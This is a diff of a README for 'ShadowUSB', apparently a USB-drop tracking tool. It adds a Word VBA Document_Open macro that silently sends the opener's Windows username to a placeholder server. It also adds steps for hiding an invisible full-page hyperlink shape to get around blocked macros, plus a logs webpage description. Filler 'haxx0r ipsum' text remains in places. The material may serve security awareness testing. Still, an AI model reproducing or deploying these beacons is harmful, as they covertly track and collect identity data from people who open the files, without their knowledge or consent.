@@ -5,7 +5,52 @@ ShadowUSB is a covert tracking tool designed to monitor and log interactions wit
 Haxx0r ipsum ascii worm *.* rsa Leslie Lamport it's a feature echo memory leak syn race condition recursively. Packet break root Linus Torvalds case kilo bypass false bytes continue endif sql foad stdio.h pragma chown. Crack else blob infinite loop packet pwned float shell afk.
 
 ### Beaconizing Word
-    Dereference class malloc semaphore flush emacs new fail bang ip root cache foo server port back door machine code baz Leslie Lamport hack the mainframe. Salt bar else break hexadecimal mailbomb ctl-c big-endian chown gobble man pages cd epoch double default thread. Gcc frack spoof ascii d00dz protocol tcp mutex headers while crack terminal fork private stack trace leapfrog script kiddies.
+Let's beaconize Word. You'll need to have the developer tab in your ribbon for Word. Click VB, make sure your are in ThisDocument, and copy in this code.  Also don't forget to change yourwebserver.com to your server address.
+```commandline
+Private Sub Document_Open()
+    MsgBox "Word Document Opened" ' Debugging message
+    Dim HttpReq As Object
+    Set HttpReq = CreateObject("MSXML2.ServerXMLHTTP")
+    HttpReq.Open "GET", "http://yourwebserver.com/tracker?doc=word&user=" & Environ("USERNAME"), False
+    HttpReq.Send
+End Sub
+```
+
+Mo Macros, Mo Problems... Your company blocks macros/VB.  No problemo.  We will use a shapes and hyperlinks to bypass this.
+```commandline
+Steps to Create a Whole-Page Link in Word M365
+
+1. Open your Word Document:
+
+ - Start with the document where you want to add the whole-page link.
+ 
+2. Insert a Shape:
+
+ - Go to the Insert tab.
+ - Click on Shapes and choose Rectangle.
+ - Draw a rectangle that covers the entire page. You can drag the edges of the shape to ensure it covers the full width and height of the page.
+
+3. Make the Shape Transparent:
+
+ - With the rectangle selected, go to the Format tab.
+ - Click on Shape Fill and select No Fill.
+ - Click on Shape Outline and select No Outline. This will make the rectangle invisible.
+
+4. Add a Hyperlink to the Shape:
+
+ - Right-click on the shape and select Link (or Hyperlink).  e.g., http://yourserver.com/track?doc=word
+ - In the dialog box, enter the URL or the location within the document you want to link to.
+ - Click OK.
+
+5. Send the Shape to the Back:
+
+ - With the shape still selected, go to the Format tab.
+ - Click on Send Backward > Send to Back to ensure it doesn't cover any text or other content on the page.
+
+6. Test the Link:
+
+ - Save your document and test the link by clicking anywhere on the page.
+```
 
 ### Beaconizing Excel
 Let's beaconize Excel. You'll need to have the developer tab in your ribbon for Excel.  Click VB, make sure you are in ThisWorkbook, and copy in this code.  Also don't forget to change yourwebserver.com/ to your web server address.
@@ -53,6 +98,16 @@ python tracker.py
 or
 python3 tracker.py
 ```
+### Tracking/Logging Webpage
+I added a webpage to the backend script.  It shows a more C-Level easy to read version of the logs.  You can this with your C-Level/non-tech management.  Also makes it easier to read for "1337 h4xx0rs"... I mean cybersecurity professionals.
+
+To access this feature:
+```commandline
+http://yourserver.com:8000/logs
+```
+
+This gives access to Real-Time Updates:  The logs will update each time the page is refreshed, reflecting the most recent tracking events.
+
 ## USB Drive [Hardware] tracking
 To track the actual USB drive we will use powershell and auto run.  You can do this with python as well. I may implement that later.  As for now powershell works great.
 
